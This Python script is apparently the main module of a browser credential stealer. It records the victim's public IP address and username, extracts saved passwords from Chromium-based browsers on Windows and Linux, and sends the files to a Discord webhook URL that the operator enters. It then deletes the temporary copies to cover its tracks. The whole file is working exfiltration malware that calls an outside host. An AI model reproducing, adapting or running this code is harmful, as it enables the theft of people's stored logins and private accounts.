import getpass
import logging
import os
import platform
import sys
from os.path import join

import requests.exceptions
from discord_webhook import DiscordWebhook
from requests import get

import chrome_based
import logger
from exceptions import Exit

# Get the temp path for every system
TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
    getpass.getuser()) if os.name == "nt" else f"/tmp"

# Print warning
os.system("cls" if os.name == "nt" else "clear")
with open("init_message.txt", "r") as file:
    print(file.read() + '\n')

# Ask for basic info
discord_webhook_url = input("[~] Enter your Discord Webhook URL >> ")
input("[?] Would you like to proceed? >> ")
print()


def main():
    ipaddr = get('https://api.ipify.org').text  # Get IP address

    # Start webhook instance
    hook = DiscordWebhook(
        url=discord_webhook_url,
        content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
        username="Auax"
    )

    # Iterate through the handled browsers
    for browser_name in chrome_based.handled_browsers:
        print(f"- {browser_name.capitalize()}")
        logging.info(browser_name.capitalize())

        try:
            filename = join(TEMP_PATH, f"{browser_name}.txt")
            if platform.system() == "Windows":
                win = chrome_based.ChromeWindows(browser_name)
                logging.info("Getting database paths and keys for Windows...")
                win.get_windows()
                logging.info("Fetching database values...")
                win.retrieve_database()
                win.save(filename)
                logging.info(f"File saved to: {filename}")

            elif platform.system() == "Linux":
                lin = chrome_based.ChromeLinux(browser_name)
                logging.info("Getting database paths and keys for Linux...")
                lin.get_linux()
                logging.info("Fetching database values...")
                lin.retrieve_database()
                lin.save(filename)
                logging.info(f"File saved to: {filename}")

            else:
                print("MacOS is not supported")
                logging.error("MacOS is not supported!")
                raise Exit(Exit.OS_NOT_SUPPORTED)

        except Exception as E:
            print(f"\nSkipping {browser_name.capitalize()}\n")
            logging.warning(f"\nSkipping {browser_name.capitalize()}")
            logging.error(E)
            continue

        # Read saved password files to send them through a hook.
        with open(filename, "rb") as file:
            hook.add_file(file=file.read(), filename=filename)

        try:
            logging.info(f"Removing {filename}...")
            os.remove(filename)  # Delete temp files
        except OSError:
            logging.warning(f"Couldn't remove {filename}")
            pass

    try:
        hook.execute()  # Send webhook

    except requests.exceptions.MissingSchema:
        logging.error("Invalid Discord Hook URL")
        print("\nInvalid Discord Hook URL. Exiting...")
        sys.exit(Exit.INVALID_HOOK_URL)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        raise Exit(Exit.KEYBOARD_INTERRUPT)
